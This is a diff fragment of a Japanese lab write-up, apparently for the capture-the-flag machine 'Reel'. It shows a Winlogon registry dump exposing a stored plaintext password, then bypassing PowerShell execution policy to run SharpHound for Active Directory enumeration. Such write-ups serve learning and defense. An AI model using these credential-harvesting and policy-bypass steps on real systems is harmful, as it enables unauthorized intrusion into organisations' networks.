@@ -191,3 +191,13 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
     DisableLockWorkstation    REG_DWORD    0x0                                                                                  
     DefaultPassword    REG_SZ    4dri@na2017!**
 ```
+
+ありがたいことに、最初からC:\Users\tom\Desktop\AD Audit\BloodHound\IngestorsにSharpHoundが用意されていた。
+
+しかしGroupPolicyによりうまく実行できないので、以下のようにExecutionPolicyを指定してPowerShellを起動してSharpHound.ps1を実行する：
+
+```
+tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>powershell -ep Bypass
+PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> . .\SharpHound.ps1
+PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData
+```
